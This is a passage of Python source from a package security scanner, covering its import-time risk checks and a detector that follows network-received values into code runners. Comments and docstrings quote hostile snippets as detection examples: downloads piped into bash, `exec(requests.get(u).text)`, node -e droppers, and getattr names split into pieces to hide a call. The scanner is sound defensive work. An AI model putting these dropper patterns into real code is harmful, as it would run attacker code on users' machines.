    """`text` with the characters of `spans` (sorted, disjoint) made spaces,
    its line breaks kept."""
    if not spans:
        return text
    parts, p = [], 0
    for s, e in spans:
        s = max(s, p)
        if e <= s:
            continue
        parts.append(text[p:s])
        parts.append("\n".join(" " * len(row) for row in text[s:e].split("\n")))
        p = e
    parts.append(text[p:])
    return "".join(parts)


def _import_code(text, lang):
    """`text` (a Python or JavaScript file) with its prose blanked (see
    above) — unchanged when it reads its own source: then its comments and
    docstrings may be what it runs or where it keeps an address."""
    if reads_own_source(text):
        return text
    literals = [] if lang == "py" else None
    comments = _lex_comment_spans(text, lang, literals=literals)
    spans = list(comments)
    if literals:
        spans = sorted(spans + _py_statement_literals(text, literals, comments))
    return _blank(text, spans)


def _call_open(rest):
    """Is a call whose '(' comes just before `rest` still open at its end?"""
    depth = 1
    for b in _BRACKET_RE.finditer(rest):
        depth += 1 if b.group() in "([{" else -1
        if depth == 0:
            return False
    return True


def _powershell_run_at(text):
    """The offset of the first PowerShell name of `text` that is an argument
    of an exec call opened at most _PS_EXEC_BACK characters before it (at
    most _PS_EXEC_MAX_NAMES names are examined), else of the first exec call
    handed a command line that names PowerShell (a name given one: `cmd =
    f"powershell …"; subprocess.run(cmd, shell=True)`), else -1."""
    for k, m in enumerate(_PS_RE.finditer(text)):
        if k >= _PS_EXEC_MAX_NAMES:
            break
        window = text[max(0, m.start() - _PS_EXEC_BACK):m.start()]
        if any(_call_open(window[c.end():]) for c in _EXEC_CALL_RE.finditer(window)):
            return m.start()
    for at, cmd in _exec_command_lines(text):
        if _PS_RE.search(cmd) is not None:
            return at
    return -1


def import_time_severity(reasons):
    """'CRITICAL' when one of `reasons` (import_time_risk's) is a strong one
    (see _STRONG_IMPORT_REASONS), else 'MAJOR'."""
    return "CRITICAL" if any(r.startswith(_STRONG_IMPORT_REASONS) for r in reasons) else "MAJOR"


def import_time_risk(text, lang=None):
    """-> (reasons, line): why code that runs on import looks hostile by
    the weaker test above ([] if not), and the 1-based line of the first
    sign. `text` has \\n line endings; `lang` 'py' or 'js' reads it without
    its prose (see _import_code). It is read again with the strings it
    decodes as it runs decoded (decoded_view; a reason found only there says
    so), and code built around a string array says so (_SA_TECHNIQUE_REASON).
    import_time_severity grades them."""
    reasons, line = _import_time_reading(text, lang)
    view = decoded_view(text)
    if view != text:
        more, at = _import_time_reading(view, lang)
        for r in more:
            if r not in reasons:
                reasons.append(r + _DV_NOTE)
                line = line or at
    sa = string_array_line(text)
    if sa is not None:
        reasons.append(_SA_TECHNIQUE_REASON)
        line = line or sa
    return reasons, line


def _import_time_reading(text, lang):
    reasons, line = _import_time_risk(text)
    if reasons and lang in ("py", "js"):
        code = _import_code(text, lang)
        if code != text:
            reasons, line = _import_time_risk(code)
    return reasons, line


def _import_flow(text):
    """(offset, kind, what, in_address) of the first local data `text` sends
    (local_data_sent_at, then the command lines it hands a shell), else None."""
    flow = local_data_sent_at(text)
    if flow is not None:
        return flow
    for at, reason in _exec_command_flows(text):
        for kind, sent in _SH_DATA_REASONS.items():
            if reason.startswith(sent):
                return at, "identity" if kind == "lookup-identity" else kind, reason[len(sent) + 2:-1], False
    return None


def _import_time_risk(text):
    reasons, line = [], None
    flow = _import_flow(text)
    if flow is not None:
        at, kind, what, in_address = flow
        # a data-capture service for any local data; a service a client talks
        # to with its user's key (Telegram, Discord, pastebin …) for what no
        # client sends: the whole environment, the instance's credentials, a
        # credential store
        harvest = (not in_address and (kind == "environment" and what == _LD_WHOLE_ENV or kind == "credentials"
                                       or kind == "file" and _CRED_STORE_RE.search(what) is not None
                                       and _PUBLIC_KEY_FILE_RE.search(what) is None))
        dest = capture_service(text) or (_EXFIL_SERVICE_RE.search(text) if harvest else None)
        ip = _PUBLIC_IP_URL_RE.search(text) if dest is None and not in_address else None
        if dest is not None:
            reasons.append(f"{_IMPORT_SENT_REASONS[kind]} ({dest.group(0)[:40]})")
        elif ip is not None:
            reasons.append(f"{_IMPORT_SENT_IP_REASONS[kind]} ({ip.group(0).split('//', 1)[1]})")
        elif harvest and kind != "credentials":
            reasons.append("reads credentials or the whole environment and sends data over the network")
        if reasons:
            line = text.count("\n", 0, at) + 1
    if "curl" in text or "wget" in text:
        piped = False
        for i, row in enumerate(text.split("\n")):
            if _runs_download_through_shell(row):
                reasons.append("runs a downloaded script through a shell")
                line = line or i + 1
                piped = True
                break
        if not piped:                   # (0.1.8) or a command line built in names, handed to an exec call
            for at, r in _exec_command_flows(text):
                if r == "pipes a download into a shell" or r == _DL_CATEGORY_REASON["run"]:
                    reasons.append("runs a downloaded script through a shell")
                    line = line or text.count("\n", 0, at) + 1
                    break
    received = _received_code_kind(text)
    if received is not None:
        reasons.append(_DL_CATEGORY_REASON[received[1]])
        line = line or received[0]
    dropped = _downloads_and_runs(text)
    if dropped is not None:
        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
        reasons.append(f"downloads a script and runs it with {interp}" if interp
                       else "downloads a file and then runs it")
        line = line or dropped[0]
    decoded = _decodes_and_runs(text)
    if decoded is not None:
        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
                       else "writes a file it decodes and runs it")
        line = line or decoded[0]
    signs = []                        # (offset, reason) of the shapes no library needs
    ps = powershell_risk(text)
    if ps:
        at = _powershell_run_at(text)
        if at >= 0:
            signs.append((at, ps[0]))
    if received is None or received[1] != "run":
        at = stager_at(text)
        if at >= 0:
            signs.append((at, "carries a script that downloads and runs code"))
    at = reverse_shell_at(text)
    if at >= 0:
        signs.append((at, "opens a reverse shell"))
    host = _HOST_INFO_RE.search(text)
    at = runs_own_source_at(text)
    if at >= 0:
        signs.append((at, "runs code it reads back from its own file or a data file shipped with it"))
    if dumps_workflow_secrets(text):
        signs.append((_SECRETS_DUMP_RE.search(text).start(),
                      "carries a GitHub Actions workflow that dumps every repository secret"))
    signs.extend(_exfil_signs(text, host))
    for at, reason in signs:
        reasons.append(reason)
        line = line or text.count("\n", 0, at) + 1
    return reasons, line


def _runs_download_through_shell(row):
    """Does this line hand a download piped into a shell, or substituted into
    a shell's or an interpreter's command line, to an exec call
    (`execSync("curl … | sh")`, `os.system("wget -qO- … | bash")`,
    `execSync('bash -c "$(curl -fsSL …)"')`)? A CLI's help text showing
    `curl … | sh` does not."""
    return (("curl" in row or "wget" in row) and _EXEC_CALL_RE.search(row) is not None
            and (_pipes_download_to_shell(row) or runs_substituted_download(row)))


# ---------------- Code that runs what it receives over the network ----------------
# TrapDoor-style import-time code downloads code and runs it:
# subprocess.run(['node', '-e', urlopen(u).read().decode()]), exec(requests.get(u)
# .text), eval(body) after https.get's data events, new Function(await r.text()).
# The pipe test above sees none of these: no shell, no curl. runs_received_code
# follows a value received over the network — a download, a socket's or a
# server's data — through the names it is assigned to, callback parameters,
# `with … as` and `for` bindings and the functions that return it, to a runner
# that takes it whole as code: eval / exec / new Function / vm, a shell
# (os.system, execSync, a shell=True call), or an interpreter's inline code
# (['node', '-e', code], [sys.executable, '-c', code], `python -c "{code}"`).
# A value put into a larger string (`npm i pkg@${version}`, '(' + text + ')')
# is not code received, and neither is a file it was saved to. A string
# literal's contents are read as code too (a program for `node -e` is written
# in one, and quotes do not always pair as the language pairs them). Install
# scripts fail on it (install_script_risk), import-time code gets the weaker
# SC-IMPORT-RISK (import_time_risk). On 66,000 installed JavaScript and Python
# files (npm, pnpm, yarn, typescript, webpack, next, jest, the AI SDKs, pip,
# setuptools, requests, httpx, the CPython library) it found nothing.
#
# Bounds: a value is followed for _DL_WINDOW rows; a call's arguments are read
# for _DL_ARG_SPAN characters, and so is each argument's value (after its
# leading whitespace, `await`s and parentheses); a row longer than
# _DL_LONG_ROW is minified code, where only a download written straight into
# a runner counts (a runner that starts within _DL_LOOKBACK characters before
# a network name). Only rows near a network name, or naming a value followed,
# are read. A row is read in one pass over its brackets, and no pattern
# backtracks more than a bounded amount, so a text costs about one pass over
# it whatever it holds: a large bundle, or a text built to make the follower
# work. The patterns and name sets live in received_spec.json (see the loader
# below); the assertions in its alternative pairs are literal (\b, (?<![\w$.])).


def _dl_alternatives(pairs, tail=""):
    """(exact, candidate) regexes from (assertion, body) alternatives. The
    candidate leaves out the leading assertions, so re skips ahead by the
    first character (several times faster on a large bundle); an exact match
    starts where a candidate one does, and _dl_finditer confirms each."""
    group = "(?:{})" if tail else "{}"
    return (re.compile(group.format("|".join(a + b for a, b in pairs)) + tail),
            re.compile(group.format("|".join(b for _a, b in pairs)) + tail))


def _dl_finditer(pair, row, pos=0, endpos=None):
    """The exact regex's matches in `row` that start in [pos, endpos) — as
    finditer would give them — found through the candidate regex (whose match
    must end by endpos)."""
    exact, cand = pair
    end = len(row) if endpos is None else endpos
    while True:
        m = cand.search(row, pos, end)
        if m is None:
            return
        e = exact.match(row, m.start())
        if e is None:
            pos = m.start() + 1
            continue
        yield e
        pos = e.end() if e.end() > e.start() else e.start() + 1


# The received-code detector's shared data — name sets, character sets and
# limits — is authored once in received_spec.json and loaded here; the
# native engine reads the values core builds from it in its rule pack
# (make_rust_tables.py), which the npm package runs too (0.1.8; through 0.1.7
# it carried a synced copy of the spec). tests/architecture/test_received_spec.py
# holds core to the spec. The patterns themselves are still defined below.
with open(os.path.join(os.path.dirname(__file__), "received_spec.json"), encoding="utf-8") as _dl_spec_f:
    _DL_SPEC = json.load(_dl_spec_f)
_DL_SPEC_ARRAYS, _DL_SPEC_CHARS, _DL_SPEC_LIMITS = _DL_SPEC["arrays"], _DL_SPEC["charstrings"], _DL_SPEC["limits"]
_DL_SPEC_PATTERNS, _DL_SPEC_ALTS = _DL_SPEC["patterns"], _DL_SPEC["alternatives"]
_DL_RE_FLAGS = {"i": re.I, "m": re.M, "s": re.S}


def _dl_flags(spec):
    f = 0
    for ch in spec:
        f |= _DL_RE_FLAGS[ch]
    return f


def _dl_re(name):
    """A plain received-code pattern, compiled from the spec."""
    p = _DL_SPEC_PATTERNS[name]
    return re.compile(p["src"], _dl_flags(p["flags"]))


def _dl_group(name):
    """An (exact, candidate) alternative pair built from the spec (see
    _dl_alternatives); `extends` prepends another group's pairs."""
    g = _DL_SPEC_ALTS[name]
    base = _DL_SPEC_ALTS[g["extends"]]["pairs"] if "extends" in g else []
    pairs = [tuple(pr) for pr in list(base) + g["pairs"]]
    return _dl_alternatives(pairs, g.get("tail", ""))


# Every source match, and every import of a network module, holds a network
# needle; every runner a run needle; a deserializer a deserial needle
# (pickle / marshal / a full yaml.load / node-serialize unserialize, CWE-502);
# a dynamic import an import needle (import(x), require(x), __import__(x),
# importlib.import_module(x)). Only rows holding one are read. The patterns and
# name sets are the spec's; the notes there say what each matches.
_DL_SOURCE = _dl_group("_DL_SOURCE")            # a value received over the network
_DL_SOURCE_RE, _DL_SOURCE_CANDIDATE_RE = _DL_SOURCE
_DL_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_NEEDLES"])
_DL_NEEDLE_RE = re.compile("|".join(re.escape(n) for n in sorted(_DL_NEEDLES, key=lambda n: (-len(n), n))))
_DL_RUN_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_RUN_NEEDLES"])
_DL_DESERIAL_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_DESERIAL_NEEDLES"])
_DL_IMPORT_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_IMPORT_NEEDLES"])
_DL_SINK_NEEDLES = _DL_RUN_NEEDLES + _DL_DESERIAL_NEEDLES + _DL_IMPORT_NEEDLES   # the file-level gate
_DL_MODULE_VALUE_RE = _dl_re("_DL_MODULE_VALUE_RE")
_DL_FUNCTION_VALUE_RE = _dl_re("_DL_FUNCTION_VALUE_RE")
_DL_IMPORT_RE = _dl_re("_DL_IMPORT_RE")
_DL_PY_NET_MODULES = frozenset(_DL_SPEC_ARRAYS["_DL_PY_NET_MODULES"])
_DL_LONG_ROW = _DL_SPEC_LIMITS["_DL_LONG_ROW"]
_DL_WINDOW = _DL_SPEC_LIMITS["_DL_WINDOW"]
_DL_ARG_SPAN = _DL_SPEC_LIMITS["_DL_ARG_SPAN"]
_DL_LOOKBACK = _DL_SPEC_LIMITS["_DL_LOOKBACK"]
_DL_NAMED_SEARCHES = _DL_SPEC_LIMITS["_DL_NAMED_SEARCHES"]   # names looked up by a search each; the rest via an index
_DL_PHASES = _DL_SPEC_LIMITS["_DL_PHASES"]                   # readings of a row's quotes begun at a call's '('
_DL_CHAIN_RE = _dl_re("_DL_CHAIN_RE")
_DL_HEAD_RE = _dl_re("_DL_HEAD_RE")
_DL_WORD_RUN_RE = _dl_re("_DL_WORD_RUN_RE")
_DL_STR_RE = _dl_re("_DL_STR_RE")
_DL_TEMPLATE_HOLE_RE = _dl_re("_DL_TEMPLATE_HOLE_RE")
_DL_FSTRING_HOLE_RE = _dl_re("_DL_FSTRING_HOLE_RE")
_DL_PREFIX_CHARS = frozenset(_DL_SPEC_CHARS["_DL_PREFIX_CHARS"])
_DL_BIND_RE = _dl_re("_DL_BIND_RE")
_DL_PARAMS_RE = _dl_re("_DL_PARAMS_RE")
_DL_FN_HEADER_RE = _dl_re("_DL_FN_HEADER_RE")
_DL_NAME_RE = _dl_re("_DL_NAME_RE")
_DL_DEFAULT_RE = _dl_re("_DL_DEFAULT_RE")
_DL_DOT_RE = _dl_re("_DL_DOT_RE")
_DL_NOT_NAMES = frozenset(_DL_SPEC_ARRAYS["_DL_NOT_NAMES"])
_DL_RUNNER = _dl_group("_DL_RUNNER")            # a call that runs its argument as code
_DL_RUNNER_RE, _DL_RUNNER_CANDIDATE_RE = _DL_RUNNER
_DL_SHELL_TRUE_RE = _dl_re("_DL_SHELL_TRUE_RE")
_DL_SHELL_CALL_RE = _dl_re("_DL_SHELL_CALL_RE")
_DL_SHELL_ARG_RE = _dl_re("_DL_SHELL_ARG_RE")
_DL_RUNNER_SHELL = _dl_group("_DL_RUNNER_SHELL")   # the runners plus run-family calls (when the file has shell=True)
_DL_RUNNER_SHELL_RE, _DL_RUNNER_SHELL_CANDIDATE_RE = _DL_RUNNER_SHELL
_DL_DESERIAL = _dl_group("_DL_DESERIAL")        # a deserializer that runs code embedded in its argument (CWE-502)
_DL_DESERIAL_RE, _DL_DESERIAL_CANDIDATE_RE = _DL_DESERIAL
_DL_IMPORT_SINK = _dl_group("_DL_IMPORT_SINK")  # a dynamic import of a received specifier
_DL_IMPORT_SINK_RE, _DL_IMPORT_SINK_CANDIDATE_RE = _DL_IMPORT_SINK
_DL_FROM_IMPORT_RE = _dl_re("_DL_FROM_IMPORT_RE")   # a Python from-import line: the bare import( sink is skipped there
_DL_BARE_IMPORT_RE = _dl_re("_DL_BARE_IMPORT_RE")
_DL_ALIAS_RE = _dl_re("_DL_ALIAS_RE")           # a runner-alias definition (name = a direct code-runner reference)
_DL_ALIAS_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_ALIAS_NEEDLES"])
_DL_ALIAS_MAX = _DL_SPEC_LIMITS["_DL_ALIAS_MAX"]       # a file's alias names, at most
_DL_DEFINING = tuple(_DL_SPEC_ARRAYS["_DL_DEFINING"])
_DL_INTERP = _dl_group("_DL_INTERP")            # an interpreter given inline code as argv (['node','-e',CODE])
_DL_INTERP_RE, _DL_INTERP_CANDIDATE_RE = _DL_INTERP
_DL_EMBED_RE = _dl_re("_DL_EMBED_RE")           # ... or written into its command line (`node -e ${code}`)
_DL_LEAD_RE = _dl_re("_DL_LEAD_RE")
_DL_CALLEE_RE = _dl_re("_DL_CALLEE_RE")
_DL_CALLEE_CHARS = frozenset(_DL_SPEC_CHARS["_DL_CALLEE_CHARS"])
_DL_BRACKET_RE = _dl_re("_DL_BRACKET_RE")
# Statements over several rows (0.1.8). The detector reads a row at a time,
# so a call whose arguments a formatter put on the rows below it
#     r = subprocess.run(
#         ['curl', '-sL', URL],
#         capture_output=True)
# or a member chain continued on the next rows (prettier's `axios\n.post(…)
# \n.then((r) => {`) hid the source from the row that binds it: the rows
# are joined for a second reading (_dl_join_rows). So are an environment
# variable's reads and writes by name, which carry a received value from one
# statement to the next (os.environ['P'] = r.text … exec(os.getenv('P')))
# the way an assignment does: each is read as one name, environ.P or
# process.env.P (_dl_env_canonical); and so is a call through a comma
# expression, (0, ns.fn)(…), which is how TypeScript and Babel call every
# imported function (_dl_comma_calls). All keep the text's length, so the
# second reading's offsets are the text's.
_DL_JOIN_ROWS = _DL_SPEC_LIMITS["_DL_JOIN_ROWS"]        # rows one statement is joined over, at most
_DL_JOIN_CHARS = _DL_SPEC_LIMITS["_DL_JOIN_CHARS"]      # characters of a joined statement, at most
# a longer text (a bundle) is read once: the second reading doubled the time
# of the benign bundles (playwright-core's 3.5 MB coreBundle.js) and found
# nothing there; a minified payload is the first reading's (its long rows)
_DL_LOGICAL_MAX_CHARS = _DL_SPEC_LIMITS["_DL_LOGICAL_MAX_CHARS"]
_DL_JOIN_CHAIN_RE = _dl_re("_DL_JOIN_CHAIN_RE")
_DL_JOIN_COMMENT_RE = _dl_re("_DL_JOIN_COMMENT_RE")
_DL_JOIN_BLOCK_RE = _dl_re("_DL_JOIN_BLOCK_RE")
_DL_ENV_PY_RE = _dl_re("_DL_ENV_PY_RE")
_DL_ENV_JS_RE = _dl_re("_DL_ENV_JS_RE")
_DL_COMMA_CALL_RE = _dl_re("_DL_COMMA_CALL_RE")
# (0.1.8, the follower's adversarial pass) and members read by name,
# getattr(m, 'pull') and m['pull'] as m.pull; and a code runner handed to a
# call as its last argument, p.then(eval) or res.on('data', eval), as the
# call it makes, (_v)=>eval(_v) — a dropper's value reaches the runner
# without a name the first reading follows.
_DL_GETATTR_RE = _dl_re("_DL_GETATTR_RE")
_DL_MEMBER_RE = _dl_re("_DL_MEMBER_RE")
_DL_CALLBACK_RE = _dl_re("_DL_CALLBACK_RE")
# (the detection round) and getattr(m, …) whose name is built of what the
# file holds — literals joined with +, names given such a value on a row of
# their own and given nothing else anywhere — as m.name too: a dropper that
# writes the member it calls in pieces or keeps it in a constant
# (NAME = 'pu' + 'll' … getattr(_net, NAME)()). The names of at most
# _DL_GETATTR_NAMES are read a file.
_DL_GETATTR_EXPR_RE = _dl_re("_DL_GETATTR_EXPR_RE")
_DL_CONST_RE = _dl_re("_DL_CONST_RE")
_DL_STR_PIECE_RE = _dl_re("_DL_STR_PIECE_RE")
_DL_NAME_FULL_RE = _dl_re("_DL_NAME_FULL_RE")
# A runner named through the builtins or the global object
# (getattr(builtins, 'exec'), __builtins__.__dict__['eval'], globalThis.eval)
# reads as the runner itself once its member is read.
_DL_BUILTINS_RE = _dl_re("_DL_BUILTINS_RE")
_DL_GIVEN_HEAD = r"(?<![\w$.])"
_DL_GIVEN_TAIL = r"[ \t]*(?:[-+*/%&|^@]|\*\*|//|<<|>>)?=(?!=)"
_DL_GETATTR_NAMES = 16
_DL_CALLBACK_NEEDLES = ("eval", "Function", "exec", "runIn")
_DL_SPACE_RE_ANY = re.compile(r"[ \t]+")
# the patterns built around names at run time (each name escaped): another
# file's runner handed to a call as its last argument (_dl_callbacks), a name
# standing whole (_DlNamed), a call of a runner alias (_dl_kind)
_DL_RUNNER_ARG_HEAD = r"(?<=[(,])[ \t]*(?P<r>"
_DL_RUNNER_ARG_TAIL = r")[ \t]*(?=\)(?![ \t]*\())"
_DL_NAMED_MID = r"(?<![\w$]"
_DL_NAMED_TAIL = r")(?![\w$])"
_DL_ALIAS_CALL_HEAD = r"""(?<![\w$.])("""
_DL_ALIAS_CALL_TAIL = r""")\s*\("""


def _dl_blank_literal(m):
    s = m.group()
    return s[0] + " " * (len(s) - 2) + s[-1] if len(s) >= 2 else s


def _dl_join_code(row):
    """`row` with its string literals' contents blanked and a trailing
    comment cut: what its brackets are counted on."""
    masked = _DL_STR_RE.sub(_dl_blank_literal, row) if ("'" in row or '"' in row or "`" in row) else row
    m = _DL_JOIN_COMMENT_RE.search(masked) if ("#" in masked or "//" in masked) else None
    return masked if m is None else masked[:m.start()]


def _dl_join_plain(code):
    """Can a row with this code be part of a joined statement: it opens no
    function, class or block (no '{' left open, no trailing ':')?"""
    end = code.rstrip()
    return (_DL_JOIN_BLOCK_RE.search(code) is None and code.count("{") == code.count("}")
            and not end.endswith((":", "{")))


def _dl_join_rows(text):
    """(joined, firsts): `text` with the line breaks inside a statement that
    spans rows made spaces (see above) — a call's arguments continued on
    the rows below its '(' until it closes, a row continued with a
    backslash, and a member chain continued on the next row — and the index
    of the text's row each joined row starts on (None when nothing was
    joined). A statement is joined whole or not at all, over at most
    _DL_JOIN_ROWS rows and _DL_JOIN_CHARS characters, and never through a
    function's or a block's body."""
    rows = text.split("\n")
    n = len(rows)
    if n < 2:
        return text, None
    codes = {}

    def code(j):
        c = codes.get(j)
        if c is None:
            c = codes[j] = _dl_join_code(rows[j])
        return c

    join = bytearray(n)
    k = 0
    while k < n - 1:
        row = rows[k]
        if "(" not in row and "[" not in row and "\\" not in row:
            k += 1                                      # (it can neither open a call nor continue with a backslash)
            continue
        c = code(k)
        if c.rstrip().endswith("\\") and len(rows[k]) + 1 + len(rows[k + 1]) <= _DL_JOIN_CHARS:
            join[k] = 1
            k += 1
            continue
        depth = c.count("(") + c.count("[") - c.count(")") - c.count("]")
        if depth > 0 and len(rows[k]) <= _DL_JOIN_CHARS and _dl_join_plain(c):
            j, total, done = k + 1, len(rows[k]), False
            while j < n and j - k < _DL_JOIN_ROWS:
                cj = code(j)
                total += 1 + len(rows[j])
                if total > _DL_JOIN_CHARS or not _dl_join_plain(cj):
                    break
                depth += cj.count("(") + cj.count("[") - cj.count(")") - cj.count("]")
                if depth <= 0:
                    done = True
                    break
                j += 1
            if done:
                for t in range(k, j):
                    join[t] = 1
                k = j
                continue
        k += 1
    for j in range(1, n):
        if join[j - 1] or _DL_JOIN_CHAIN_RE.match(rows[j]) is None or not code(j - 1).strip():
            continue
        first, total = j - 1, len(rows[j - 1]) + 1 + len(rows[j])
        while first > 0 and join[first - 1] and j - first < _DL_JOIN_ROWS:
            first -= 1
            total += len(rows[first]) + 1
        if (first == 0 or not join[first - 1]) and j - first < _DL_JOIN_ROWS and total <= _DL_JOIN_CHARS:
            join[j - 1] = 2
    if not any(join):
        return text, None
    # A member chain's rows are joined without the break and the indent
    # between them (`axios` + `.post(…)` reads axios.post(…), as the source
    # patterns want it); what is taken out is put back at the end of the
    # joined statement, so each row still starts where the text's does.
    out, pad, firsts = [rows[0]], 0, [0]
    for k in range(1, n):
        how = join[k - 1]
        if how == 2:
            row = rows[k]
            body = row.lstrip(" \t")
            pad += 1 + len(row) - len(body)
            out.append(body)
        elif how:
            out.append(" ")
            out.append(rows[k])
        else:
            out.append(" " * pad + "\n")
            pad = 0
            out.append(rows[k])
            firsts.append(k)
    out.append(" " * pad)
    return "".join(out), firsts


def _dl_env_canonical(text):
    """`text` with each environment variable read or written by name as one
    name (see above): environ.NAME in Python, process.env.NAME in
    JavaScript, padded with spaces to the length it replaces."""
    if "environ" in text or "getenv" in text:
        text = _DL_ENV_PY_RE.sub(lambda m: ("environ." + (m.group("a") or m.group("b") or m.group("c"))).ljust(
            len(m.group())), text)
    if "process" in text and "env" in text:
        text = _DL_ENV_JS_RE.sub(lambda m: ("process.env." + m.group("a")).ljust(len(m.group())), text)
    return text


def _dl_comma_calls(text):
    """`text` with each call through a comma expression — (0, ns.fn)(…),
    TypeScript's and Babel's call of an imported function — read as the
    call it is, ns.fn(…), padded with spaces to the length it replaces."""
    if "(0" not in text:
        return text
    return _DL_COMMA_CALL_RE.sub(lambda m: _DL_SPACE_RE_ANY.sub("", m.group("c")).ljust(len(m.group())), text)


def _dl_members(text):
    """`text` with each member read by name as a dotted member (see above):
    getattr(obj, 'name') and obj['name'] as obj.name, padded with spaces to
    the length they replace; a getattr whose name the file builds of what
    it holds too (_dl_getattr_names); and a runner named through the
    builtins or the global object as the runner."""
    if "getattr" in text:
        text = _DL_GETATTR_RE.sub(lambda m: (_DL_SPACE_RE_ANY.sub("", m.group("o")) + "."
                                             + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
        if "getattr" in text:
            text = _dl_getattr_names(text)
    if "['" in text or '["' in text:
        text = _DL_MEMBER_RE.sub(lambda m: ("." + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
    if "builtins" in text or "global" in text or "window" in text:
        text = _DL_BUILTINS_RE.sub(lambda m: " " * len(m.group()), text)
    return text


def _dl_getattr_names(text):
    """`text` with each getattr(obj, …) whose name is literals joined with +
    and names the file gives such a value (see above) read as obj.name."""
    found = _DL_GETATTR_EXPR_RE.findall(text)
    if not found:
        return text
    wanted = sorted({p.group("n") for _o, e in found for p in _DL_STR_PIECE_RE.finditer(e)
                     if p.group("n") is not None})[:_DL_GETATTR_NAMES]
    consts = _dl_constants(text, wanted) if wanted else {}

    def sub(m):
        value = _dl_joined(m.group("e"), consts)
        if value is None or _DL_NAME_FULL_RE.fullmatch(value) is None:
            return m.group()
        return (_DL_SPACE_RE_ANY.sub("", m.group("o")) + "." + value).ljust(len(m.group()))
    return _DL_GETATTR_EXPR_RE.sub(sub, text)


def _dl_constants(text, names):
    """{name: value} of `names` that `text` gives a string on a row of its
    own and gives nothing else (see above)."""
    values = {}
    for m in _DL_CONST_RE.finditer(text):
        if m.group("n") in names:
            values.setdefault(m.group("n"), []).append(m.group("v"))
    out = {}
    for name, given in values.items():
        if len(given) == 1 and len(re.findall(_DL_GIVEN_HEAD + re.escape(name) + _DL_GIVEN_TAIL, text)) == 1:
            value = _dl_joined(given[0], {})
            if value is not None:
                out[name] = value
    return out


def _dl_joined(expr, consts):
    """The string `expr` (literals and names joined with +) is, the names
    read in `consts`; None where a name is not one of them."""
    out = []
    for p in _DL_STR_PIECE_RE.finditer(expr):
        if p.group("n") is not None:
            if p.group("n") not in consts:
                return None
            out.append(consts[p.group("n")])
        else:
            out.append(p.group("a") if p.group("a") is not None else p.group("b"))
    return "".join(out)


def _dl_callbacks(text, runners=()):
    """`text` with each code runner handed to a call as its last argument
    (see above) — and each of `runners`, a function of another file of the
    package that runs its argument (the cross-file follower's) — read as the
    call it makes: (_v)=>eval(_v). Its row gets longer; its line is the same."""
    if ")" not in text:
        return text
    if any(n in text for n in _DL_CALLBACK_NEEDLES):
        text = _DL_CALLBACK_RE.sub(lambda m: "(_v)=>" + _DL_SPACE_RE_ANY.sub("", m.group("r")) + "(_v)", text)
    names = [n for n in runners if n in text]
    if names:
        rx = re.compile(_DL_RUNNER_ARG_HEAD + "|".join(re.escape(n) for n in sorted(names)) + _DL_RUNNER_ARG_TAIL)
        text = rx.sub(lambda m: "(_v)=>" + m.group("r") + "(_v)", text)
    return text


def _dl_logical(text, runners=()):
    """(alt, firsts): the second reading's text (see above) — statements
    joined, environment variables and members read as names, (0, f)(…) as
    f(…), each padded to the length it replaces, and a runner handed to a
    call as the call it makes — and _dl_join_rows' firsts."""
    joined, firsts = _dl_join_rows(text)
    return _dl_comma_calls(_dl_callbacks(_dl_members(_dl_env_canonical(joined)), runners)), firsts


def _dl_lhs_names(lhs):
    """The names an assignment's left side binds (a member chain stays whole)."""
    lhs = lhs.strip()
    if lhs[:1] in "{[":
        return [n for n in _DL_NAME_RE.findall(lhs) if n not in _DL_NOT_NAMES]
    out = []
    for part in lhs.split(","):
        part = _DL_DOT_RE.sub(".", part.strip())
        if part and part not in _DL_NOT_NAMES:
            out.append(part)
    return out


def _dl_defined_here(row, i):
    """Is the call at row[i] the name in a definition: def exec(…),
    function exec(…), async exec(…)?"""
    j = i
    while j > 0 and row[j - 1].isspace():
        j -= 1
    if j == i:
        return False
    for word in _DL_DEFINING:
        s = j - len(word)
        if s >= 0 and row.startswith(word, s) and (s == 0 or not (row[s - 1] == "_" or row[s - 1].isalnum())):
            return True
    return False


def _dl_any(offsets, lo, hi):
    """Is one of the sorted offsets in [lo, hi)?"""
    i = bisect.bisect_left(offsets, lo)
    return i < len(offsets) and offsets[i] < hi


def _dl_within(starts, ends, lo, hi):
    """Is one of the spans (sorted, not overlapping) inside [lo, hi)?"""
    i = bisect.bisect_left(starts, lo)
    return i < len(starts) and ends[i] <= hi


def _dl_in_code(seg, p):
    """Is offset p code where seg reads it: outside its string literals, or in
    a template literal's or an f-string's interpolation? A program written in
    a string literal (for `node -e`, for exec) is text until something runs
    it, so a network call named in that text is not a value the code around
    the literal receives (xmlhttprequest spawns `node -e` with a program
    that makes a request and writes the response to a file). The literal's
    text is read as code of its own where a binding or a call in it is read
    (segment_at, phase_at)."""
    i = seg.literal_at(p)
    if i < 0:
        return True
    row, s, e = seg.row, seg.lit_s[i], seg.lit_e[i]
    if row[s] == "`":
        holes = _DL_TEMPLATE_HOLE_RE
    else:
        pre = row[max(seg.lo, s - 2):s]
        while pre and pre[0] not in _DL_PREFIX_CHARS:
            pre = pre[1:]
        if "f" not in pre and "F" not in pre:
            return False
        holes = _DL_FSTRING_HOLE_RE
    for m in holes.finditer(row, s, e):
        if m.start() < p < m.end():
            return True
    return False


class _DlTaint:
    """The names holding a received value, with the row each was last bound
    on (followed for _DL_WINDOW rows), and the names that carry the network
    wherever they are used (network modules, functions returning a received
    value). `heads` holds their first names: a row naming none of them uses
    none."""

    def __init__(self, always):
        self.always = set(always)
        self.at = {}
        self.heads = {n.split(".")[0] for n in self.always}

    def name_live(self, name, row):
        """Is `name` such a name at `row`?"""
        if name in self.always:
            return True
        t = self.at.get(name)
        return t is not None and row - t <= _DL_WINDOW

    def live(self, chain, row):
        """Is `chain`, or a chain it is a property of, such a name at `row`?"""
        acc = None
        for part in _DL_DOT_RE.split(chain):
            acc = part if acc is None else acc + "." + part
            if self.name_live(acc, row):
                return True
        return False


def _dl_carried(row, i, taint, k):
    """Does the value at row[i] begin with a received value — a source or a
    tainted name (None: sources only) — seen through await, parentheses and
